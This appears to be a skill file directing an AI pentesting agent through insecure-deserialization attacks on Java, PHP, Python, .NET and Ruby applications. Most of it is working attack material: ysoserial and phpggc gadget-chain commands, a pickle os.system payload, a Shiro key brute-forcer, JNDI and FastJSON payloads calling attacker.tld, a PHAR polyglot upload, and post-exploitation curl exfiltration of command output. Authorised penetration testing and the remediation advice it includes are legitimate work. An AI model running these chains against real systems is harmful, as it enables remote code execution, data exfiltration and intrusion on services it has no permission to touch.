# Insecure Deserialization Attack Skill

Dedicated workflow for forging and delivering object-deserialization gadget chains across Java (ysoserial), PHP (phpggc / PHAR polyglots), Python (pickle / yaml.unsafe_load), .NET (BinaryFormatter / ViewState), and Ruby (Marshal / YAML). Use this skill when an untrusted byte-stream sink has already been identified and the attacker-controlled bytes flow into a language-level deserializer; if the user is asking for general RCE / SSTI / command injection, the rce built-in is the right choice instead.

## When to Classify Here

Classify a request to this skill when the operator names a deserialization sink, names a serializer/format, or names a gadget tool. Examples:

- "Forge a CommonsCollections gadget for the /api/import endpoint that takes base64 ObjectInputStream"
- "The PHP app stores the session in a cookie that round-trips through unserialize, build a phpggc chain"
- "Land RCE through this pickle blob the worker pulls off the queue"
- "ASP.NET ViewState has no MAC, mint a TextFormattingRunProperties payload"
- "Ruby on Rails secret_key_base leaked, sign a Marshal cookie"
- "Drop a PHAR polyglot through the avatar uploader so a later file_exists() triggers it"
- "Walk the JNDI / Log4Shell deserializer reachable on this Java service"

Trigger keywords: insecure deserialization, deserialization gadget, unserialize, ObjectInputStream, readObject, ysoserial, marshalsec, phpggc, PHAR, PHAR polyglot, pickle exploit, yaml.unsafe_load, Marshal.load, BinaryFormatter, LosFormatter, ViewState, __VIEWSTATE, NetDataContractSerializer, JSON.NET TypeNameHandling, FastJSON autoType, Jackson polymorphic typing, SnakeYAML untrusted YAML, Hessian, Kryo, secret_key_base Marshal, cookie unserialize.

How this differs from neighbors:

- **rce built-in** is broader: command injection, SSTI, OGNL/SpEL, eval, media pipelines, Log4Shell. Pick rce when the user has not committed to a deserialization angle, asks generically for "RCE on this app", or names commix / sstimap / Jinja2 / Twig / ImageMagick. Pick this skill when they have.
- **sql_injection** is unrelated unless the deserialized blob lives inside a SQL row, and even then the injection happens at deserialization, not in the SQL parser.
- **path_traversal** overlaps only on the PHAR-via-upload sub-step where you abuse a `phar://` wrapper through a traversal sink. If the request is "read /etc/passwd via php://filter" it stays in path_traversal. If it is "drop a PHAR and trigger it via phar://", it lives here.
- **cve_exploit** wins when the operator names a CVE plus a Metasploit module (e.g. "exploit Spring4Shell with msf"). Pick this skill when they want to hand-forge the gadget instead of running the canned MSF module.
- **ssrf** wins when the goal is to reach an internal service. Pick this skill when the goal is to land code via a deserializer reached through that internal service (e.g. Redis -> Java RMI registry -> CommonsCollections).
- **community sqli_exploitation / xss_exploitation / api_testing / ssrf_exploitation** never collide on keywords; deserialization is byte-stream-level, not request-parameter-level.

## Workflow

### Phase 1: Reconnaissance (Informational)

1. **Pull known sinks from the graph.** Use `query_graph` to enumerate endpoints, parameters, cookies, and headers already tagged as suspicious during recon, plus the application stack (Java / PHP / Python / .NET / Ruby) so the gadget choice is grounded in the real runtime:
   ```
   query_graph("MATCH (p:Parameter)-[:BELONGS_TO]->(e:Endpoint) WHERE p.project_id = $project_id AND (p.name =~ '(?i).*(token|state|session|data|payload|obj|cache|cookie|cart|user|prefs|view).*' OR e.path =~ '(?i).*(import|deserialize|cache|session|preview|export|view|state).*') RETURN e.url, e.method, p.name, p.example_value LIMIT 200")
   query_graph("MATCH (h:Host)-[:RUNS]->(s:Service) WHERE h.project_id = $project_id RETURN h.address, s.name, s.product, s.version")
   ```
2. **Fingerprint the stack.** Use `execute_curl` to grab tech banners, framework cookies, and ViewState markers:
   ```
   execute_curl url="https://target.tld/" method="HEAD" return_headers=true
   execute_curl url="https://target.tld/login" method="GET" return_body_first_chars=4096
   ```
   Score signals: `JSESSIONID` / `Set-Cookie: rememberMe=...` (Java + Apache Shiro), `Set-Cookie: laravel_session=...` (PHP / Laravel), `__VIEWSTATE` hidden input (ASP.NET WebForms), `_rails_session=` (Ruby), `csrftoken` + `sessionid` (Django pickle sessions when configured), Tomcat/Jetty `Server:` header.
3. **Probe candidate sinks for byte-stream shape.** With `execute_curl`, capture every parameter that round-trips opaque base64 / hex / binary content. Note Content-Type headers `application/x-java-serialized-object`, `application/octet-stream`, `application/vnd.php.serialized`, or anything whose body decodes to a magic header (Java starts `\xac\xed\x00\x05`, .NET BinaryFormatter starts `\x00\x01\x00\x00\x00\xff\xff\xff\xff`, Python pickle protocol 2+ starts `\x80\x02`, Ruby Marshal starts `\x04\x08`, PHP serialized starts with `O:` or `a:`).
4. **Decode candidate blobs.** Use `execute_code` to confirm the format and extract class names:
   ```
   execute_code language="python" code="""
import base64, sys
b = base64.b64decode('<BLOB>')
print('first8:', b[:8].hex())
# Java: print class names embedded in the stream
import re
print('classes:', re.findall(rb'[A-Za-z][A-Za-z0-9._\\$]+', b)[:40])
"""
   ```
5. **Set up the OOB oracle.** Open an interactsh listener so blind chains have somewhere to land:
   ```
   kali_shell command="interactsh-client -v -o /tmp/oast.log &"
   ```
   Capture the issued domain (`*.oast.fun`) for use in URLDNS / DNS / HTTP gadgets in Phase 2.
6. **Catalogue runtime libraries.** If the application leaks a stack trace, error page, or `/actuator/env` style endpoint, harvest it: the precise CommonsCollections version, Spring version, Hibernate version, Jackson version, or Symfony minor decides which gadget chain will land.

Once at least one candidate sink is confirmed (a parameter that accepts a forged blob without immediately rejecting it, plus a known runtime), **request transition to exploitation phase**.

### Captured-traffic workflow (proxy_brain tools)

When HTTP Traffic Capture is enabled, redamon.params and redamon.grep hunt captured cookies and parameters for opaque base64/hex blobs carrying deserializer magic prefixes (`rO0` for Java ObjectInputStream, `gASV`/`gAJ` for Python pickle, `O:` or `a:` for PHP serialized, `__VIEWSTATE` for .NET). redamon.replay then delivers a forged blob by swapping the body or cookie of a captured transaction (for example an Apache Shiro `rememberMe` cookie), recorded as a new replay txn. Where the proxy stops: gadget-chain forging (ysoserial/phpggc), Shiro key brute-force, the LDAP referral server, and OAST confirmation all stay offline/out-of-band; redamon.replay is pinned to the origin host.

### Phase 2: Exploitation

Pick the per-language track that matches the runtime. Each track follows the same arc: build a blind oracle gadget, prove out-of-band that the bytes are deserialized, then upgrade to a command-execution gadget.

#### 2.A Java (ObjectInputStream / readObject)

1. **Blind URLDNS oracle.** Confirms deserialization without needing any specific gadget library; `URLDNS` only needs `java.net.URL` and a `HashMap`:
   ```
   kali_shell command="ysoserial URLDNS 'http://canary.<OAST_ID>.oast.fun/' > /tmp/urldns.bin"
   kali_shell command="base64 -w0 /tmp/urldns.bin > /tmp/urldns.b64"
   execute_curl url="https://target.tld/api/import" method="POST" headers='{"Content-Type":"application/x-java-serialized-object"}' body_file="/tmp/urldns.bin"
   ```
   Watch `/tmp/oast.log` for a DNS hit on `canary.<OAST_ID>`. If it lands, the sink deserializes attacker bytes.
2. **Pick a real gadget chain.** Use `kali_shell` to enumerate available chains, then mint one against your OAST domain so success/failure is observable even when stdout is suppressed:
   ```
   kali_shell command="ysoserial 2>&1 | head -60"
   kali_shell command="ysoserial CommonsCollections6 'curl http://exec.<OAST_ID>.oast.fun/cc6' > /tmp/cc6.bin"
   ```
   Default chain priority by library presence: `CommonsCollections6` (CC 3.1 / 4.0), `CommonsCollections5` (CC 3.x), `CommonsCollections1-4` (older CC), `CommonsBeanutils1` (when CommonsBeanutils on classpath), `Spring1` / `Spring2` (Spring), `Hibernate1` / `Hibernate2` (Hibernate), `Click1`, `JRE8u20` (last resort, JRE-only).
3. **Deliver the chain.** Wrap in the transport the sink expects:
   ```
   execute_curl url="https://target.tld/api/import" method="POST" headers='{"Content-Type":"application/x-java-serialized-object"}' body_file="/tmp/cc6.bin"
   # Cookie transport (e.g. Apache Shiro rememberMe, AES-CBC + base64 + Java serialized):
   execute_code language="python" code="<encrypt cc6.bin with the leaked Shiro key, see Shiro section below>"
   ```
4. **Apache Shiro `rememberMe` track.** If the cookie is `rememberMe=...` and the server sets `rememberMe=deleteMe` on bad cookies, run the Shiro key-bruteforce + chain delivery:
   ```
   execute_code language="python" code="""
import base64, requests, subprocess
from Crypto.Cipher import AES
KEYS = open('/opt/keys/shiro_keys.txt').read().splitlines()  # public Shiro key list
chain = open('/tmp/cc6.bin','rb').read()
for k in KEYS:
    key = base64.b64decode(k)
    iv = b'\\x00'*16
    pad = 16 - (len(chain)%16)
    body = iv + AES.new(key, AES.MODE_CBC, iv).encrypt(chain + bytes([pad])*pad)
    cookie = base64.b64encode(body).decode()
    r = requests.get('https://target.tld/', cookies={'rememberMe':cookie}, allow_redirects=False, timeout=10)
    if 'rememberMe=deleteMe' not in r.headers.get('Set-Cookie',''):
        print('candidate key:', k); break
"""
   ```
5. **JNDI / Log4Shell deserialization.** When the sink reaches `InitialContext.lookup` or a Log4j 2.x `${jndi:...}` lookup, pair the JNDI URI with a serving LDAP referral that returns a serialized payload. Stand up a marshalsec-style LDAP referral with `execute_code` (Python `ldap3` server) when marshalsec is unavailable:
   ```
   execute_code language="python" code="<minimal LDAP referral server returning javaSerializedData = open('/tmp/cc6.bin','rb').read()>"
   execute_curl url="https://target.tld/" headers='{"X-Api-Version":"${jndi:ldap://attacker.tld:1389/Exploit}"}'
   ```
6. **Polymorphic-typing JSON variants.** For Jackson `enableDefaultTyping` or FastJSON `autoType`, the gadget rides as a JSON object whose `@type` (Jackson) or `@type` (FastJSON) names a TemplatesImpl-style sink:
   ```
   execute_curl url="https://target.tld/api/v1/object" method="POST" headers='{"Content-Type":"application/json"}' body='{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.tld:1389/Exploit","autoCommit":true}'
   ```

#### 2.B PHP (unserialize / PHAR)

1. **Blind oracle via Monolog/POP1.** Even when the framework is unknown, Monolog ships in most PHP stacks; `Monolog/RCE1` runs an arbitrary callback:
   ```
   kali_shell command="phpggc -l | head -40"
   kali_shell command="phpggc Monolog/RCE1 system 'curl http://php.<OAST_ID>.oast.fun/m1' > /tmp/m1.ser"
   ```
2. **Deliver the chain.** Encode for the transport the sink uses (raw body, base64 cookie, JSON string, etc.):
   ```
   execute_code language="python" code="""
import base64, requests
chain = open('/tmp/m1.ser','rb').read()
r = requests.get('https://target.tld/', cookies={'session': base64.b64encode(chain).decode()})
print(r.status_code, r.headers, r.text[:300])
"""
   ```
3. **PHAR polyglot via file uploader.** When unserialize is not directly reachable but a `file_exists()` / `fopen()` / `getimagesize()` / `is_file()` call accepts a path of the form `phar://uploads/x.jpg`, smuggle a PHAR inside a JPG and trigger the `phar://` wrapper:
   ```
   kali_shell command="phpggc -p phar -pj /opt/phpggc/example.jpg -o /tmp/poly.jpg Laravel/RCE9 system 'id > /tmp/o'"
   execute_curl url="https://target.tld/upload" method="POST" headers='{"Content-Type":"multipart/form-data"}' multipart_files='[{"name":"avatar","filename":"poly.jpg","content_path":"/tmp/poly.jpg","content_type":"image/jpeg"}]'
   execute_curl url="https://target.tld/profile?avatar=phar:///var/www/uploads/<RETURNED_PATH>/poly.jpg/test"
   ```
4. **Chain selection cheatsheet.**
   - Laravel 5/6/7/8/9 -> `Laravel/RCE1` ... `Laravel/RCE15` (newest first).
   - Symfony / Drupal -> `Symfony/RCE1-4`, `Drupal7/RCE1-2`.
   - Magento -> `Magento/RCE1-3`.
   - WordPress (with Guzzle / Monolog plugins) -> `WordPress/RCE1`, `Guzzle/RCE1`, `Monolog/RCE*`.
   - Doctrine / SwiftMailer / Yii / CodeIgniter / SlimPHP all carry chains; `phpggc -l <Framework>` filters.
   - When no framework is known, walk the cheap ones in order: `Monolog/RCE*`, `Guzzle/RCE*`, `SwiftMailer/RCE*`.

#### 2.C Python (pickle / PyYAML / numpy / jsonpickle)

1. **Build a pickle.** `__reduce__` is the canonical primitive; pair it with an OAST oracle so blind landings are visible:
   ```
   execute_code language="python" code="""
import pickle, base64
class P:
    def __reduce__(self):
        import os
        return (os.system, ('curl http://py.<OAST_ID>.oast.fun/$(whoami)',))
blob = pickle.dumps(P())
print(base64.b64encode(blob).decode())
"""
   ```
2. **Deliver via the sink.** Common Python sinks are message-queue payloads (Celery / Kombu pickle serializer), Django session cookies when `SESSION_SERIALIZER` is `PickleSerializer`, scikit-learn / joblib `.pkl` model uploads, and numpy `.npy` allow_pickle=True:
   ```
   execute_curl url="https://target.tld/predict" method="POST" headers='{"Content-Type":"application/octet-stream"}' body_file="/tmp/payload.pkl"
   ```
3. **YAML track.** When the sink calls `yaml.load` / `yaml.unsafe_load` (PyYAML before forced safe-load), `!!python/object/apply` is the canonical primitive:
   ```
   execute_curl url="https://target.tld/import" method="POST" headers='{"Content-Type":"application/x-yaml"}' body='!!python/object/apply:os.system ["curl http://yaml.<OAST_ID>.oast.fun/$(whoami)"]'
   ```
4. **jsonpickle track.** `jsonpickle.decode` accepts `{"py/object":"os.system","py/newargs":["..."]}` style payloads when `safe=False`. Mint with `execute_code`.

#### 2.D .NET (BinaryFormatter / LosFormatter / ViewState / JSON.NET)

1. **ViewState without MAC.** When the page has `__VIEWSTATE` and `__VIEWSTATEGENERATOR` and the response does not include a `__VIEWSTATEMAC` failure on tampered input, the `TextFormattingRunProperties` chain lands command execution. Use `ysoserial.net` if installed; otherwise hand-craft via `execute_code`:
   ```
   execute_code language="python" code="""
# Minimal LosFormatter TextFormattingRunProperties payload
import base64
xaml = '''<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
   xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
   xmlns:System="clr-namespace:System;assembly=mscorlib"
   xmlns:Diag="clr-namespace:System.Diagnostics;assembly=system">
 <ObjectDataProvider x:Key="x" ObjectType="{x:Type Diag:Process}" MethodName="Start">
   <ObjectDataProvider.MethodParameters>
     <System:String>cmd.exe</System:String>
     <System:String>/c curl http://net.<OAST_ID>.oast.fun/$(whoami)</System:String>
   </ObjectDataProvider.MethodParameters>
 </ObjectDataProvider>
</ResourceDictionary>'''
print('xaml:', base64.b64encode(xaml.encode()).decode())
# Wrap into a TextFormattingRunProperties LosFormatter blob; use ysoserial.net for the binary frame
"""
   ```
   Deliver the LosFormatter blob as the new `__VIEWSTATE` field via `execute_curl` POST.
2. **JSON.NET TypeNameHandling.** When responses or requests carry `$type` properties, the deserializer accepts arbitrary types. The canonical chain is `System.Configuration.Install.AssemblyInstaller`, `System.Windows.Data.ObjectDataProvider`, or `System.Diagnostics.Process` via ObjectDataProvider:
   ```
   execute_curl url="https://target.tld/api/v1/save" method="POST" headers='{"Content-Type":"application/json"}' body='{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089","FileName":"cmd.exe","Arguments":"/c curl http://j.<OAST_ID>.oast.fun"}}}'
   ```

#### 2.E Ruby (Marshal / YAML / Rails secret_key_base)

1. **YAML / `Psych.load` Erubis chain.** When `Psych.load` runs on attacker input or on a Rails session cookie whose `secret_key_base` leaked, ride the canonical `ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy` -> `Erubis::Eruby` chain:
   ```
   execute_code language="python" code="""
yaml = '''--- !ruby/object:Gem::Requirement
requirements:
  - - "\xc2\xb1"
    - !ruby/object:Gem::Version
      version: "1.0"
'''  # placeholder, emit the full DeprecatedInstanceVariableProxy/Erubis chain via a Ruby helper
print(yaml)
"""
   ```
   Build the real chain inside Kali with a tiny Ruby script:
   ```
   kali_shell command="ruby -ryaml -e 'puts YAML.dump(...)' > /tmp/payload.yml"
   ```
   If Ruby is not present in the sandbox, deliver a literal copy of the well-known chain (multiple public PoCs ship the YAML verbatim) and substitute the OAST callback URL.
2. **Sign the cookie.** Re-sign the new Marshal/YAML blob with the leaked `secret_key_base` using `execute_code`, then deliver via `execute_curl` Cookie header.

### Phase 3: Post-Exploitation

1. **Confirm command context.** With shell-level execution proven, gather minimum fingerprint without writing files:
   ```
   <chain command> id;hostname;uname -a;cat /etc/os-release 2>/dev/null;cat /proc/1/cgroup 2>/dev/null
   ```
   Pipe the output back through OAST when stdout is not visible: `... | curl -sSf -X POST --data-binary @- http://exfil.<OAST_ID>.oast.fun/`.
2. **Stage a stable channel only if in scope.** A reverse shell is rarely necessary to prove deserialization; a single command that exfils `id;hostname;ip a` is usually enough for the report. If the engagement allows, drop a minimal in-memory listener via `metasploit_console` and a matching `execute_code`-generated payload. Avoid persistence unless the SoW asks.
3. **Lateral implications.** Note container/cluster signal the same way the rce skill does: presence of `/.dockerenv`, `/var/run/secrets/kubernetes.io/serviceaccount/token`, AWS/GCP/Azure metadata reachability via SSRF from within the runtime.
4. **Clean up safely.** Remove uploaded PHARs, payload blobs, and any temporary cron/systemd entries. Leave a single timestamped marker file under `/tmp/` so the customer can verify the exact moment of access during incident review.

## Reporting Guidelines

For each landed gadget, capture:

- **Sink:** endpoint + parameter (or cookie/header), with the byte-stream format (`Java ObjectInputStream`, `PHP unserialize`, `Python pickle protocol 2`, `BinaryFormatter`, `Marshal`, `Psych.load`).
- **Runtime:** language and framework version (`Spring 5.3.18`, `Laravel 9.52.4`, `Django 4.2 PickleSerializer`).
- **Gadget chain used:** exact name (`CommonsCollections6`, `Laravel/RCE9`, `pickle.__reduce__ -> os.system`, `TextFormattingRunProperties`, `Erubis/Eruby`).
- **Oracle proof:** OAST hit log line (DNS or HTTP) timestamped within the same minute as the request, plus the issued OAST domain. This is the deserialization-specific equivalent of an SQLi DNS callback.
- **Command-context proof:** minimal `id; hostname; uname -a` output (or its OAST-exfiltrated equivalent) tied back to the hit.
- **Impact narrative:** code execution under the application user, plus container / cloud reach, plus any data the runtime has standing access to (DB creds, queue tokens, cloud role).
- **Reproduction artifact:** the raw chain bytes (base64) and the exact transport (curl one-liner or HTTP request) that delivered them, so the customer can replay in a clean environment.
- **Remediation pointer:** disable polymorphic typing, replace `BinaryFormatter` / `pickle` / `unserialize` / `Marshal.load` with format-bound parsers, integrity-sign the byte-stream (HMAC), restrict allowed classes via `ObjectInputFilter` (Java 9+), `allowed_classes:` (PHP 7+), `safe_load` (PyYAML/JSON), `secure_deserialization` middleware, and rotate the leaked signing keys.

## Important Notes

- **Confirm authorisation before delivering any exec gadget.** Deserialization PoCs land code; URLDNS / pickle-OAST oracles do not. Always start with the OAST oracle, never with `RCE*` chains.
- **Prefer DNS callbacks over HTTP for the oracle.** DNS leaks less metadata, traverses egress filters more often, and produces a cleaner timeline.
- **Do not run Java gadget chains under load.** `CommonsCollections6` invokes `LazyMap.get` paths that can pin a worker thread; one shot per minute is plenty for confirmation.
- **PHAR delivery rewrites disk on the target.** Track the path of every uploaded PHAR/JPG so cleanup actually removes them. Some sinks rename uploads; capture the server-side path from the response.
- **`marshalsec` and `ysoserial.net` are not in the Kali image** (build complexity vs image size). Fallbacks: for marshalsec-style JNDI referral servers, stand up an ad-hoc LDAP referral with `execute_code` + the `ldap3` library; for `ysoserial.net`, hand-craft `TextFormattingRunProperties` XAML inside `execute_code` and frame it manually with LosFormatter byte structure (binary frame is documented in the YSoSerial.NET README).
- **`phpggc` requires PHP CLI on the sandbox.** Already installed via the Kali Dockerfile; if a future image strips `php-cli`, the chain step blocks and the agent must fall back to copying a pre-baked chain from `/opt/phpggc/phpggc.cache/` or generating it offline.
- **Polymorphic-typing payloads (Jackson / FastJSON / JSON.NET) are still deserialization** even though the wire format is JSON. The classification belongs here, not in api_testing.
- **Useful references:** Frohoff & Lawrence original "Marshalling Pickles" (AppSecCali 2015), AmbionicsSecurity phpggc README, PortSwigger "Exploiting deserialization vulnerabilities in Java" (2017), `pwntools` `flatten` for non-stream Python primitives, LiveOverflow PHAR polyglot writeups, Alvaro Munoz "Friday the 13th: JSON Attacks" (Black Hat USA 2017) for .NET typing chains, and the CVE listings around CommonsCollections (CVE-2015-7501), Apache Shiro (CVE-2016-4437), Telerik UI (CVE-2017-9248, CVE-2019-18935), Spring4Shell (CVE-2022-22965), and Log4Shell (CVE-2021-44228).
